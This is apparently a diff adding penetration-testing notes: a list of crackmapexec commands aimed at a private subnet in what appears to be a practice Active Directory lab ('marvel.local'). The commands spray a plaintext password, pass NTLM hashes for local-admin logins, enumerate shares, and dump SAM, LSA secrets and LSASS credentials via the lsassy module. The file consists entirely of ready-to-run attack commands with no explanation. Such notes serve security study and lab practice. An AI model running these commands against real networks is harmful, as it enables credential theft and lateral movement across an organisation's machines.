@@ -1,0 +1,16 @@
+
+crackmapexec smb 192.168.57.0/24 -u administrator -d marvel.local -p Password1
+crackmapexec smb 192.168.57.0/24 -u administrator -d MARVEL -p Password1 --sam
+crackmapexec smb 192.168.57.0/24 -u administrator -d MARVEL -p Password1 --shares
+
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth
+crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H c46b9e588fa0d112de6f59fd6d58eae3 --local-auth
+
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth --sam
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth --shares
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth --lsa
+crackmapexec smb 192.168.57.0/24 -u administrator -H eb7126ae2c91ed56dcc475c072863269 --local-auth -M lsassy
+
+crackmapexec smb -L
+cmedb
